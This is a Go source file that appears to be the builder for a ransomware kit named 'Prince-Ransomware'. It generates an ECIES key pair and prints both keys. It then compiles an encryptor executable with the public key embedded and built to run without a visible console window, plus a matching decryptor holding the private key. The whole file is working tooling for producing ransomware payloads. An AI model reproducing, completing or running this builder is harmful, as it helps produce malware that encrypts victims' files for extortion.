package main

import (
	"fmt"
	"log"
	"os"
	"os/exec"

	eciesgo "github.com/ecies/go"
)

var startupBanner = `
██████╗ ██████╗ ██╗███╗   ██╗ ██████╗███████╗
██╔══██╗██╔══██╗██║████╗  ██║██╔════╝██╔════╝
██████╔╝██████╔╝██║██╔██╗ ██║██║     █████╗  
██╔═══╝ ██╔══██╗██║██║╚██╗██║██║     ██╔══╝  
██║     ██║  ██║██║██║ ╚████║╚██████╗███████╗
╚═╝     ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝╚══════╝
                                             
`

func main() {
	cmd := exec.Command("cmd", "/c", "cls")
	cmd.Stdout = os.Stdout
	cmd.Run()

	fmt.Print(startupBanner)

	priv, pub, err := generateECIESKeyPair()
	if err != nil {
		panic(err)
	}

	log.Println("Private Key (Hex):", priv.Hex())
	log.Println("Public Key (Hex):", pub.Hex(false))

	// Compile the encryptor
	os.Chdir("Encryptor")
	ldflags := fmt.Sprintf("-H=windowsgui -s -w -X 'Prince-Ransomware/configuration.PublicKey=%s'", pub.Hex(false))
	cmd = exec.Command("cmd", "/C", "go", "build", "-ldflags", ldflags, "-o", "../Prince-Built.exe")
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	err = cmd.Run()

	if err != nil {
		fmt.Println("Error building executable:", err)
		return
	}

	// Compile the decryptor
	os.Chdir("../Decryptor")

	ldflags = fmt.Sprintf("-H=windowsgui -s -w -X 'Prince-Decryptor/configuration.PrivateKey=%s'", priv.Hex())
	cmd = exec.Command("cmd", "/C", "go", "build", "-ldflags", ldflags, "-o", "../Decryptor-Built.exe")
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	err = cmd.Run()

	if err != nil {
		fmt.Println("Error building executable:", err)
		return
	}

	fmt.Println("Build successful")
}

func generateECIESKeyPair() (*eciesgo.PrivateKey, *eciesgo.PublicKey, error) {
	key, err := eciesgo.GenerateKey()
	if err != nil {
		return nil, nil, err
	}

	return key, key.PublicKey, nil
}
